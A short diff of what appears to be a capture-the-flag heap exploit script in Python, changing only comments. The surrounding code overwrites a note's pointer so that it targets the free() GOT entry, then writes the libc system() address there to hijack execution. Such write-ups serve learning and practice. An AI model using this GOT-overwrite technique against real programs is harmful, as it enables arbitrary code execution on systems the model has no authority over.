@@ -201,12 +201,12 @@ if __name__ == "__main__":
 
     # delete_note(1) makes target points to itself (to be precise, -24 bytes)
     #
-    # [COUNT 1] [OCCUPIED YES] [SIZE 8] [8 bytes]
+    # [COUNT 1] [OCCUPIED YES] [NOTE SIZE 8] [PTR to CHUNK]
     edit_note(0,payload_len, p64(1) + p64(1) + p64(8) + p64(b.got['free']) + 'x'*(payload_len-32))
 
     raw_input('after editing note_0->ptr to 0x602018...')
 
-    edit_note(0,8, p64(libc_base+libc.symbols['system']))
+    edit_note(0,8, p64(libc_base+libc.symbols['system']))       # now aligned (no need add 3-qword prefix)
 
     raw_input('after editing note_0->ptr to system()...')
 
